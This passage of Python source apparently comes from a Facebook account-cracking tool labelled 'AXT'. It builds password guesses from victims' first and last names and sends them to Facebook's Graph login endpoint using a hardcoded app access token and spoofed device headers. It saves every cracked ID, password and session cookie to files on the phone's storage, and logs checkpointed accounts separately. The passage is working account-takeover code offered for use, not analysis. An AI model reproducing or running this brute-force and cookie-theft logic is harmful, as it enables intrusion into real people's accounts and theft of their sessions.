                                coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                                print('\r\r[1;90m[[1;32mAXT-OK[1;90m][1;32m ' + ids + ' | ' + pas + '[1;97m')
                                print('\r\r[1;90m[💥[1;90m][1;37m ' + coki)
                                print('')
                                open('/sdcard/AXT-FILE-M1-OK-COOKIES.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                                oks.append(ids)
                                break
                            else:
                                if 'www.facebook.com' in po['error']['message']:
                                    if 'y' in pcp:
                                        print('\r\r[1;90m[[38;5;205mAXT-CP[1;90m][38;5;205m ' + ids + ' | ' + pas + '[1;97m')
                                    open('/sdcard/AXT-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                    cps.append(ids)
                                    break
                                else:
                                    pass
                        loop += 1
                    except Exception as e:
                        return None
                def ___M_T_H_D_2___(ids, names, passlist):
                    global loop
                    try:
                        xp = f'{bx}[{gx}MR{bx}]{gx}'
                        sys.stdout.write(f'\r\r{xp}-[1;90m[[1;32mAXT[1;90m] [1;37m%s[1;90m|[1;37mOK:-[1;32m%s ' % (loop, len(oks)))
                        sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                            ln = names.split(' ')[1]
                        except:
                            ln = fn
                        for pw in passlist:
                            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                            random_seed = random.Random()
                            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'auth.login': {'method': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}}
                            headers = {'User-Agent': ____U_A_1____(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                            url = 'https://graph.facebook.com/auth/login'
                            po = requests.post(url, data=data, headers=headers).json()
                            if 'session_key' in po:
                                coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                                print('\r\r[1;90m[[1;32mAXT-OK[1;90m][1;32m ' + ids + ' | ' + pas + '[1;97m')
                                print('\r\r[1;90m[💥[1;90m][1;37m ' + coki)
                                print('')
                                open('/sdcard/AXT-FILE-M2-OK-COOKIES.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                                oks.append(ids)
                                break
                            else:
                                if 'www.facebook.com' in po['error']['message']:
                                    if 'y' in pcp:
                                        print('\r\r[1;90m[[38;5;205mAXT-CP[1;90m][38;5;205m ' + ids + ' | ' + pas + '[1;97m')
                                    open('/sdcard/AXT-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                    cps.append(ids)
                                    break
                                else:
                                    pass
                        loop += 1
                    except Exception as e:
                        return None
                On()
    except ModuleNotFoundError as e:
            print(f'>> MISSING MODULE: {e}')
            print('>> INSTALLING MISSING MODULES....! ')
            try:
                import subprocess
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests', 'bs4', 'rich', 'urllib3', 'httplib2', 'arrow'])
                print('>> MODULES INSTALLED SUCCESSFULLY!')
                os.execv(sys.executable, [sys.executable] + sys.argv)
            except:
                print('>> FAILED TO INSTALL MODULES. PLEASE INSTALL MANUALLY:')
                print('>> pip install requests bs4 rich urllib3 httplib2 arrow')
                exit()
            else:
                pass
            finally:
                pass